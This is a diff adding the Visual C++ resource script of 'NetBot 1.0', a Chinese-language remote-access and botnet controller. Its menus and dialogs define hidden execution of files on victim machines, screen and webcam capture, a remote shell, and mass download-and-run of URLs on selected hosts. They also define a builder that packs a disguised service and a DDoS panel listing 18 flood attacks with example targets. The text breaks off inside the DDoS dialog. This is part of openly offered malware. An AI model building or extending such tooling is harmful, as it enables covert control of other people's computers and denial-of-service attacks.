@@ -1,0 +1,992 @@
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// 中文(简体，中国) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\NetBot.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON                    "res\\small.ico"
+
+IDI_OL_FILE             ICON                    "res\\outlook\\File.ico"
+
+IDI_OL_REMOTE           ICON                    "res\\outlook\\remote.ico"
+
+IDI_OL_PROCESS          ICON                    "res\\outlook\\process.ico"
+
+IDI_OL_DOS              ICON                    "res\\outlook\\dos.ico"
+
+IDI_OL_CONFIG           ICON                    "res\\outlook\\config.ico"
+
+IDI_OL_HELP             ICON                    "res\\outlook\\Help.ico"
+
+IDI_OL_UPDATE           ICON                    "res\\outlook\\UPDATE.ico"
+
+IDI_OL_EXIT             ICON                    "res\\outlook\\exit.ico"
+
+IDI_OL_SERVER           ICON                    "res\\outlook\\server.ico"
+
+IDI_OL_HOME             ICON                    "res\\outlook\\home.ico"
+
+IDI_LIST_ONLINE         ICON                    "res\\online.ico"
+
+IDI_OL_SCREEN           ICON                    "res\\outlook\\screen.ico"
+
+IDI_OL_DDOS             ICON                    "res\\outlook\\ddos.ico"
+
+IDI_LIST_VIDEO          ICON                    "res\\online2.ico"
+
+IDI_OL_TRANS            ICON                    "res\\outlook\\FileTran.ico"
+
+IDI_FILE_UP             ICON                    "res\\upfile.ico"
+
+IDI_FILE_DOWN           ICON                    "res\\downfile.ico"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404b0"
+        BEGIN
+            VALUE "CompanyName", "NetBot"
+            VALUE "FileDescription", "NetBot"
+            VALUE "FileVersion", "1.0.0.1"
+            VALUE "InternalName", "NetBot"
+            VALUE "LegalCopyright", "Copy left (C) 2025"
+            VALUE "OriginalFilename", "NetBot.exe"
+            VALUE "ProductName", "NetBot.exe"
+            VALUE "ProductVersion", "1.0.0.1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// RT_MANIFEST
+//
+
+1                       RT_MANIFEST             "res\\xp.xml"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// SKIN
+//
+
+IDR_SKIN                SKIN                    "res\\Skin.ssk"
+
+IDR_ORG                 SKIN                    "res\\outlook\\skin1.bin"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Bitmap
+//
+
+IDB_FOLDERS             BITMAP                  "res\\folders.bmp"
+
+IDR_FILE_TOOLBAR        BITMAP                  "res\\bmp00001.bmp"
+
+IDB_FILETB_DISABLE      BITMAP                  "res\\FileToolBarDisable.bmp"
+
+IDB_FILETB_HOT          BITMAP                  "res\\FileToolBarHot.bmp"
+
+IDB_FILETB_NORMAL       BITMAP                  "res\\FileToolBarNormal.bmp"
+
+IDB_LOGO                BITMAP                  "res\\DDOSLogo.bmp"
+
+IDB_BMP_MAIN            BITMAP                  "res\\MainToolbar.bmp"
+
+IDR_MAINTOOLBAR         BITMAP                  "res\\toolbar1.bmp"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Toolbar
+//
+
+IDR_FILE_TOOLBAR TOOLBAR 24, 24
+BEGIN
+    BUTTON      ID_FILE_BACKUP
+    BUTTON      ID_FILE_COPY
+    BUTTON      ID_FILE_PASTE
+    BUTTON      ID_FILE_DELETE
+    BUTTON      ID_FILE_UPLOAD
+    BUTTON      ID_FILE_DOWNLOAD
+    BUTTON      ID_FILE_REFURSH
+    BUTTON      ID_FILE_CHGVIEW
+END
+
+IDR_MAINTOOLBAR TOOLBAR 32, 32
+BEGIN
+    BUTTON      ID_BTN_TONLINE
+    BUTTON      ID_BTN_TDDOS
+    BUTTON      ID_BTN_TFILETRAN
+    BUTTON      ID_BTN_TUPDATE
+    BUTTON      ID_BTN_TCONFIG
+    BUTTON      ID_BTN_TSERVER
+    BUTTON      ID_BTN_TWEBSITE
+    BUTTON      ID_BTN_TEXIT
+END
+
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Menu
+//
+
+IDR_MENU_FILEVIEW MENU
+BEGIN
+    POPUP "FileView"
+    BEGIN
+        MENUITEM "大图标",                         ID_MENU_FILEVIEW_BIG
+        MENUITEM "小图标",                         ID_MENU_FILEVIEW_SMALL
+        MENUITEM "列表",                          ID_MENU_FILEVIEW_LIST
+        MENUITEM "详细描述",                        ID_MENU_FILEVIEW_DETAIL
+    END
+END
+
+IDR_MENU_FILERIGHT MENU
+BEGIN
+    POPUP "RightButton"
+    BEGIN
+        MENUITEM "正常运行/打开",                     ID_FILE_RUNNORMAL
+        MENUITEM "隐藏运行/打开",                     ID_FILE_RUNHIDE
+        MENUITEM SEPARATOR
+        MENUITEM "复制",                          ID_FILE_COPY
+        MENUITEM "粘贴",                          ID_FILE_PASTE
+        MENUITEM "删除",                          ID_FILE_DELETE
+        MENUITEM SEPARATOR
+        MENUITEM "上传文件",                        ID_FILE_UPLOAD
+        MENUITEM "下载文件",                        ID_FILE_DOWNLOAD
+        MENUITEM SEPARATOR
+        MENUITEM "刷新",                          ID_FILE_REFURSH
+    END
+END
+
+IDR_MENU_ONLINE MENU
+BEGIN
+    POPUP "ONLINE"
+    BEGIN
+        MENUITEM "文件管理",                        ID_ONLINE_FILEMANAGE
+        MENUITEM "屏幕监控",                        ID_ONLINE_SCREEN
+        MENUITEM "进程查询",                        ID_ONLINE_PROCESS
+        MENUITEM "远程Shell",                     ID_ONLINE_SHELL
+        MENUITEM "视频捕捉",                        ID_ONLINE_VIDEO
+        MENUITEM SEPARATOR
+        MENUITEM "关机",                          ID_ONLINE_POWEROFF
+        MENUITEM "重启",                          ID_ONLINE_REBOOT
+        MENUITEM "注销",                          ID_ONLINE_LOGOFF
+        MENUITEM SEPARATOR
+        MENUITEM "卸载",                          ID_ONLINE_UNINSTALL
+        MENUITEM "重新加载",                        ID_ONLINE_RESTART
+    END
+END
+
+IDR_MENU_MAIN MENU
+BEGIN
+    POPUP "文件(&F)"
+    BEGIN
+        MENUITEM "更新IP(&U)",                    ID_BTN_TUPDATE
+        MENUITEM "配服务端(&S)",                    ID_BTN_TSERVER
+        MENUITEM "退出(&E)",                      ID_BTN_TEXIT
+    END
+    POPUP "功能(&N)"
+    BEGIN
+        MENUITEM "文件传输(&S)",                    ID_BTN_TFILETRAN
+        MENUITEM SEPARATOR
+        MENUITEM "DDOS(&D)",                    ID_BTN_TDDOS
+        MENUITEM "设置(&I)",                      ID_BTN_TCONFIG
+    END
+    POPUP "帮助(&H)"
+    BEGIN
+        MENUITEM "帮助文档(&A)",                    ID_BTN_THELP
+        MENUITEM "主页(&L)",                      ID_BTN_TWEBSITE
+    END
+END
+
+IDR_SHELL MENU
+BEGIN
+    POPUP "文件"
+    BEGIN
+        MENUITEM "保存",                          ID_S_SAVE
+        MENUITEM "清空",                          ID_S_CLEAR
+        MENUITEM SEPARATOR
+        MENUITEM "退出",                          ID_S_EXIT
+    END
+    POPUP "About"
+    BEGIN
+        MENUITEM "帮助",                          ID_S_HELP
+        MENUITEM SEPARATOR
+        MENUITEM "关于",                          ID_S_ABOUT
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// EXE
+//
+
+IDR_FSG                 EXE                     "res\\fsg.exe"
+
+IDR_UPX                 EXE                     "res\\upx.exe"
+
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_NETBOT_DIALOG DIALOGEX 0, 0, 512, 266
+STYLE DS_SETFONT | DS_MODALFRAME | DS_3DLOOK | DS_CENTER | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "NetBot 1.0"
+MENU IDR_MENU_MAIN
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    CONTROL         "List1",IDC_LIST_ONLINE,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,0,25,512,180
+    GROUPBOX        "",IDC_STATIC,10,219,433,37
+    CONTROL         "Windows XP",IDC_RADIO1,"Button",BS_AUTORADIOBUTTON,10,210,57,8
+    CONTROL         "Windows 7",IDC_RADIO2,"Button",BS_AUTORADIOBUTTON,74,210,49,8
+    CONTROL         "选择所有",IDC_RADIO3,"Button",BS_AUTORADIOBUTTON,261,210,42,8
+    CONTROL         "反向选择",IDC_RADIO4,"Button",BS_AUTORADIOBUTTON,304,210,40,8
+    CONTROL         "取消选择",IDC_RADIO5,"Button",BS_AUTORADIOBUTTON,348,210,43,8
+    LTEXT           "URL:",IDC_STATIC,90,228,15,8
+    PUSHBUTTON      "发送",IDC_BTN_MULEXEC,390,226,49,12
+    EDITTEXT        IDC_EXEC_URL,107,226,278,12,ES_AUTOHSCROLL
+    LTEXT           "URL:",IDC_STATIC,90,242,15,8
+    PUSHBUTTON      "发送",IDC_BTN_MULOPEN,390,241,49,12
+    EDITTEXT        IDC_OPEN_URL,107,241,278,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "选中关机",IDC_BTN_MULPOWEROFF,449,241,53,12
+    PUSHBUTTON      "选中重启",IDC_BTN_MULREBOOT,449,226,53,12
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKRECT | SS_SUNKEN,0,25,512,1
+    LTEXT           "[选中主机下载运行]",IDC_STATIC,18,228,63,8
+    LTEXT           "[选中主机弹出网页]",IDC_STATIC,18,242,63,8
+    PUSHBUTTON      "追加选择",IDC_BTN_SELNUM,390,208,49,12
+    EDITTEXT        IDC_EDIT_SELNUM,450,208,51,12,ES_AUTOHSCROLL
+    CONTROL         "Windows 8",IDC_RADIO6,"Button",BS_AUTORADIOBUTTON,138,210,53,8
+    CONTROL         "Windows 10",IDC_RADIO7,"Button",BS_AUTORADIOBUTTON,202,210,54,8
+    CONTROL         "",IDC_DLG_RECT,"Static",SS_BLACKFRAME | NOT WS_VISIBLE | WS_DISABLED,0,0,512,265
+END
+
+IDD_PROCESS_DLG DIALOGEX 0, 0, 457, 276
+STYLE DS_SETFONT | DS_3DLOOK | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "[进程查询]"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    CONTROL         "List1",IDC_PROCESS_LIST,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,0,0,457,251
+    PUSHBUTTON      "刷新进程",IDC_GETPROCESS_BTN,329,252,61,13
+    PUSHBUTTON      "关闭进程",IDC_KILLPROCESS_BTN,395,252,61,13
+END
+
+IDD_SHELL_DLG DIALOGEX 0, 0, 432, 235
+STYLE DS_SETFONT | DS_3DLOOK | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "[远程Shell]"
+MENU IDR_SHELL
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    EDITTEXT        IDC_CMDEDIT,0,0,432,218,ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_NOHIDESEL | ES_WANTRETURN | WS_VSCROLL,WS_EX_STATICEDGE
+    PUSHBUTTON      "执行",IDC_BTN_SHELLRUN,382,220,47,12
+    COMBOBOX        IDC_COMBO_CMDLINE,3,220,375,12,CBS_DROPDOWN | WS_VSCROLL | WS_TABSTOP
+END
+
+IDD_UPDATE_DLG DIALOGEX 0, 0, 217, 226
+STYLE DS_SETFONT | DS_MODALFRAME | WS_CAPTION | WS_SYSMENU
+CAPTION "更新IP"
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    GROUPBOX        "FTP更新IP",IDC_STATIC,4,1,212,129
+    GROUPBOX        "希网更新IP",IDC_STATIC,4,133,212,87
+    LTEXT           "FTP地址:",IDC_STATIC,15,17,40,10
+    EDITTEXT        IDC_EDIT_FTPIP,61,14,141,12,ES_AUTOHSCROLL
+    LTEXT           "Ftp端口:",IDC_STATIC,15,30,32,9
+    EDITTEXT        IDC_EDIT_FTPPORT,61,27,62,12,ES_AUTOHSCROLL
+    LTEXT           "帐号:",IDC_STATIC,15,44,35,8
+    EDITTEXT        IDC_EDIT_FTPUSER,61,40,141,12,ES_AUTOHSCROLL
+    LTEXT           "密码:",IDC_STATIC,15,55,34,8
+    EDITTEXT        IDC_EDIT_FTPPASS,61,53,141,12,ES_PASSWORD | ES_AUTOHSCROLL
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKRECT | SS_SUNKEN,7,67,206,1
+    LTEXT           "相对地址:",IDC_STATIC,9,71,50,9
+    EDITTEXT        IDC_FTPURL,61,70,141,12,ES_AUTOHSCROLL
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKRECT | SS_SUNKEN,7,84,204,1
+    LTEXT           "您的IP:",IDC_STATIC,12,90,40,10
+    LTEXT           "端口:",IDC_STATIC,12,103,22,9
+    EDITTEXT        IDC_COMBO_FTPPORT,61,102,62,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "更新",IDC_BTN_FTPUPDATE,158,102,46,14
+    COMBOBOX        IDC_COMBO_FTPIP,61,88,141,63,CBS_DROPDOWN | CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    LTEXT           "上传的文件内容为:[ip:port],例如[192.168.0.102:8080]",IDC_STATIC,8,118,206,11
+    LTEXT           "帐号:",IDC_STATIC,15,150,35,10
+    EDITTEXT        IDC_EDIT_DNSUSER,61,147,141,12,ES_AUTOHSCROLL
+    LTEXT           "密码:",IDC_STATIC,15,162,33,8
+    EDITTEXT        IDC_EDIT_DNSPASS,61,160,141,12,ES_PASSWORD | ES_AUTOHSCROLL
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKFRAME | SS_SUNKEN,11,187,200,1
+    LTEXT           "域名:",IDC_STATIC,15,174,21,8
+    EDITTEXT        IDC_EDIT_DNSDOMAIN,61,173,141,12,ES_AUTOHSCROLL
+    LTEXT           "您的IP:",IDC_STATIC,15,191,31,10
+    COMBOBOX        IDC_COMBO_DNSIP,61,189,141,64,CBS_DROPDOWN | CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    PUSHBUTTON      "更新",IDC_BTN_DNSUPDATE,157,203,46,14
+    LTEXT           "跳转链接",IDC_STATIC_3322,14,207,44,10
+END
+
+IDD_FILE_DLG DIALOGEX 0, 0, 503, 272
+STYLE DS_SETFONT | DS_3DLOOK | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "[文件管理]"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    CONTROL         "List1",IDC_FILELIST,"SysListView32",LVS_REPORT | LVS_SINGLESEL | LVS_AUTOARRANGE | WS_BORDER | WS_TABSTOP,124,30,373,233
+    EDITTEXT        IDC_EDIT_PATH,36,13,411,14,ES_AUTOHSCROLL
+    LTEXT           "地址(&D)",IDC_STATIC,6,16,26,11
+    CONTROL         "Tree1",IDC_FILETREE,"SysTreeView32",TVS_HASBUTTONS | TVS_HASLINES | WS_BORDER | WS_HSCROLL | WS_TABSTOP,5,30,114,233
+    PUSHBUTTON      "转到(&G)",IDC_BTN_ADDRGO,451,13,46,14
+END
+
+IDD_SERVER_DLG DIALOGEX 0, 0, 224, 182
+STYLE DS_SETFONT | DS_MODALFRAME | DS_3DLOOK | DS_CENTER | WS_CAPTION | WS_SYSMENU
+CAPTION "配置服务端"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    PUSHBUTTON      "生成",IDC_OK,164,163,54,15
+    GROUPBOX        "生成服务端",IDC_STATIC,2,3,222,177
+    LTEXT           "URL转发/DNS:Port/IP:Port:",IDC_STATIC,6,13,137,8
+    CONTROL         "FSG压缩",IDC_RADIO1,"Button",BS_AUTORADIOBUTTON | WS_GROUP,13,48,66,9
+    CONTROL         "UPX压缩",IDC_RADIO2,"Button",BS_AUTORADIOBUTTON,88,48,59,8
+    CONTROL         "无压缩",IDC_RADIO3,"Button",BS_AUTORADIOBUTTON,161,48,55,10
+    CONTROL         "Progress1",IDC_SERVERPROGRESS,"msctls_progress32",WS_BORDER,6,102,212,13
+    LISTBOX         IDC_SVRLOG_LIST,6,117,212,43,LBS_SORT | LBS_NOINTEGRALHEIGHT | NOT WS_BORDER | WS_VSCROLL | WS_TABSTOP,WS_EX_STATICEDGE
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKRECT | SS_SUNKEN,5,42,215,1
+    LTEXT           "服务名称:",IDC_STATIC,10,62,37,11
+    LTEXT           "服务显示:",IDC_STATIC,10,75,37,11
+    LTEXT           "服务描述:",IDC_STATIC,10,88,37,11
+    EDITTEXT        IDC_EDIT_NAME,47,60,171,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_DISP,47,73,171,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_DESC,47,86,171,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT,181,24,37,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_URL,7,24,171,13,CBS_DROPDOWN | CBS_SORT | WS_VSCROLL | WS_TABSTOP
+END
+
+IDD_SET_DLG DIALOGEX 0, 0, 202, 139
+STYLE DS_SETFONT | DS_MODALFRAME | WS_CAPTION | WS_SYSMENU
+CAPTION "程序设置"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    GROUPBOX        "连接设置",IDC_STATIC,4,7,194,51
+    PUSHBUTTON      "应用",IDC_BTN_SETSAVE1,152,20,40,14
+    LTEXT           "监听端口:",IDC_STATIC,12,24,49,9
+    EDITTEXT        IDC_EDIT_LISTENPORT,67,21,75,13,ES_AUTOHSCROLL
+    LTEXT           "最大上线:",IDC_STATIC,12,40,45,8
+    EDITTEXT        IDC_EDIT_CONNECTMAX,67,38,75,13,ES_AUTOHSCROLL
+    GROUPBOX        "皮肤设置",IDC_STATIC,4,63,195,72
+    PUSHBUTTON      "应用",IDC_BTN_SETSAVE4,152,76,40,14
+    CONTROL         "使用Aero皮肤",IDC_RADIO1,"Button",BS_AUTORADIOBUTTON,13,77,112,13
+    CONTROL         "使用China皮肤",IDC_RADIO2,"Button",BS_AUTORADIOBUTTON,13,94,97,17
+    CONTROL         "使用Win7皮肤",IDC_RADIO3,"Button",BS_AUTORADIOBUTTON,13,114,96,15
+END
+
+IDD_SCREEN_DLG DIALOGEX 0, 0, 637, 304
+STYLE DS_SETFONT | DS_3DLOOK | DS_CENTER | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "[屏幕监控]"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    CONTROL         "Progress1",IDC_PROGRESS_SCREEN,"msctls_progress32",PBS_SMOOTH,3,1,217,11
+    PUSHBUTTON      "开始",IDC_BTN_START,452,2,50,11
+    CONTROL         "256色",IDC_RADIO_COLOR1,"Button",BS_AUTORADIOBUTTON | WS_GROUP,229,4,27,8
+    CONTROL         "16位色",IDC_RADIO_COLOR2,"Button",BS_AUTORADIOBUTTON,269,4,29,8
+    CONTROL         "真彩色",IDC_RADIO_COLOR3,"Button",BS_AUTORADIOBUTTON,310,4,29,8
+    PUSHBUTTON      "保存当前屏幕",IDC_BTN_SAVEBMP,505,2,50,11
+    CONTROL         "键盘鼠标控制",IDC_CHECK_CTRL,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,397,4,54,8
+    CONTROL         "32位色",IDC_RADIO_COLOR4,"Button",BS_AUTORADIOBUTTON,351,4,32,8
+END
+
+IDD_DDOS_DLG DIALOGEX 0, 0, 491, 332
+STYLE DS_SETFONT | WS_CHILD
+FONT 9, "宋体", 0, 0, 0x1
+BEGIN
+    EDITTEXT        IDC_EDIT_IP1,205,140,131,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT1,366,140,30,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_COMBO_TYPE1,28,140,26,69,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_EDIT_THREAD1,82,140,31,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_THREAD1,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,110,140,11,12
+    EDITTEXT        IDC_EDIT_NUM1,142,140,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_NUM1,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,172,140,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_ATTACK1,406,139,36,13
+    PUSHBUTTON      "停止",IDC_BTN_STOP1,447,139,34,13
+    GROUPBOX        "自动选择主机模式(任务1-4)",IDC_STATIC,3,126,486,73
+    GROUPBOX        "",IDC_STATIC,3,29,486,47
+    LTEXT           "常规攻击:",IDC_STATIC,14,36,38,9
+    LTEXT           "[01]SYN Flood",IDC_STATIC,7,46,52,8
+    LTEXT           "[02]ICMP Flood",IDC_STATIC,66,46,57,8
+    LTEXT           "[03]UDP Flood",IDC_STATIC,7,56,52,8
+    LTEXT           "[04]UDP碎片",IDC_STATIC,66,56,47,8
+    LTEXT           "[05]TCP Flood",IDC_STATIC,7,65,52,8
+    LTEXT           "[06]TCP多连接",IDC_STATIC,66,65,55,8
+    LTEXT           "网站攻击:",IDC_STATIC,145,37,56,8
+    LTEXT           "[07]无缓冲Get洪水",IDC_STATIC,140,46,74,8
+    LTEXT           "[08]CC变异攻击",IDC_STATIC,140,56,61,8
+    LTEXT           "[09]HTTP空GET请求",IDC_STATIC,140,65,73,8
+    LTEXT           "特殊攻击:",IDC_STATIC,231,36,37,8
+    LTEXT           "[10]传奇攻击模式",IDC_STATIC,222,46,77,8
+    LTEXT           "[11]路由网关攻击",IDC_STATIC,222,56,75,8
+    LTEXT           "[12]智能混合攻击",IDC_STATIC,222,65,77,8
+    LTEXT           "目标:",IDC_STATIC,183,141,21,9
+    LTEXT           "端口:",IDC_STATIC,344,141,21,9
+    LTEXT           "类型:",IDC_STATIC,7,141,20,8
+    LTEXT           "线程:",IDC_STATIC,60,141,21,10
+    LTEXT           "数量:",IDC_STATIC,121,141,20,9
+    LTEXT           "合并攻击:",IDC_STATIC,305,36,42,9
+    LTEXT           "[13]SYN+UDP Flood",IDC_STATIC,300,46,72,8
+    LTEXT           "[14]ICMP+TCP Flood",IDC_STATIC,300,56,72,8
+    LTEXT           "[15]UDP +TCP Connect",IDC_STATIC,300,65,80,8
+    LISTBOX         IDC_LIST_LOG,269,266,219,56,LBS_SORT | LBS_NOINTEGRALHEIGHT | NOT WS_BORDER | WS_VSCROLL | WS_TABSTOP,WS_EX_STATICEDGE
+    EDITTEXT        IDC_EDIT_IP,49,91,268,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT,49,105,34,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_COMBO_TYPE,134,105,28,69,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_EDIT_THREAD,207,105,28,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_THREAD,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,232,105,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_ATTACK,438,88,41,14
+    PUSHBUTTON      "停止",IDC_BTN_STOP,438,105,41,14
+    GROUPBOX        "手动选择主机模式(任务0)",IDC_STATIC,4,78,485,45
+    LTEXT           "攻击目标:",IDC_STATIC,10,93,39,9
+    LTEXT           "攻击端口:",IDC_STATIC,9,108,36,9
+    LTEXT           "攻击类型:",IDC_STATIC,93,108,37,8
+    LTEXT           "攻击线程:",IDC_STATIC,170,107,37,10
+    LTEXT           "主机数量:",IDC_STATIC,246,107,36,10
+    LTEXT           "攻击目标可以是IP/DNS/网页URL。CC变异攻击和轮询CC需要URL作为参数。",IDC_STATIC,3,263,263,8
+    LTEXT           "DNS     举例:  www.baidu.com",IDC_STATIC,3,283,152,8
+    LTEXT           "IP      举例:  202.199.24.35",IDC_STATIC,4,273,135,8
+    LTEXT           "URL     举例:  http://www.abc.com/show.asp?id=123",IDC_STATIC,3,293,220,8
+    LTEXT           "新式攻击:",IDC_STATIC,399,35,56,8
+    LTEXT           "[16]Fin_Wait1 Attack",IDC_STATIC,392,45,81,8
+    LTEXT           "[17]Fin_Wait2 Attack ",IDC_STATIC,392,55,89,8
+    LTEXT           "[18]Established Attack",IDC_STATIC,392,65,93,8
+    EDITTEXT        IDC_EDIT_IP2,205,155,131,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT2,366,155,30,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_COMBO_TYPE2,28,155,26,69,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_EDIT_THREAD2,82,155,31,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_THREAD2,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,110,155,11,12
+    EDITTEXT        IDC_EDIT_NUM2,142,155,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_NUM2,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,172,155,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_ATTACK2,406,154,36,13
+    PUSHBUTTON      "停止",IDC_BTN_STOP2,447,154,34,13
+    LTEXT           "目标:",IDC_STATIC,183,157,21,9
+    LTEXT           "端口:",IDC_STATIC,344,157,21,9
+    LTEXT           "类型:",IDC_STATIC,7,157,20,8
+    LTEXT           "线程:",IDC_STATIC,60,157,21,10
+    LTEXT           "数量:",IDC_STATIC,121,157,20,9
+    EDITTEXT        IDC_EDIT_IP3,205,169,131,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT3,366,169,30,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_COMBO_TYPE3,28,169,26,69,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_EDIT_THREAD3,82,169,31,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_THREAD3,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,110,169,11,12
+    EDITTEXT        IDC_EDIT_NUM3,142,169,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_NUM3,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,172,169,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_ATTACK3,406,168,36,13
+    PUSHBUTTON      "停止",IDC_BTN_STOP3,447,168,34,13
+    LTEXT           "目标:",IDC_STATIC,183,171,21,9
+    LTEXT           "端口:",IDC_STATIC,344,171,20,9
+    LTEXT           "类型:",IDC_STATIC,7,171,20,8
+    LTEXT           "线程:",IDC_STATIC,60,171,21,10
+    LTEXT           "数量:",IDC_STATIC,121,171,20,9
